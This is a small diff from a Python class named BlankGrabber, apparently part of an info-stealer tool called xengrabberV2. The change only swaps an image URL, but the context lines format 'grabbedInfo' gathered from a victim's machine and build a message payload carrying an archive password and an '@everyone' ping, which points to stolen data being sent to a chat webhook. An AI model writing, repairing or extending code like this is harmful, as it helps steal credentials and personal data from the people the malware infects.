@@ -1350,7 +1350,7 @@ class BlankGrabber:
             
             grabbedInfo = "\n".join([key.ljust(20) + " : " + str(value) for key, value in collection.items()])
 
-            image_url = "https://raw.githubusercontent.com/xen-light/xengrabberV2/main/.github/workflows/image.png"
+            image_url = "https://raw.githubusercontent.com/xen-light/xengrabberV2/main/xengrabberV2/.github/workflows/image.png"
 
             payload = {
   "content": ("||@everyone||" if Settings.PingMe else "") + (" Archive Password: `{}`".format(password) if password else ""),
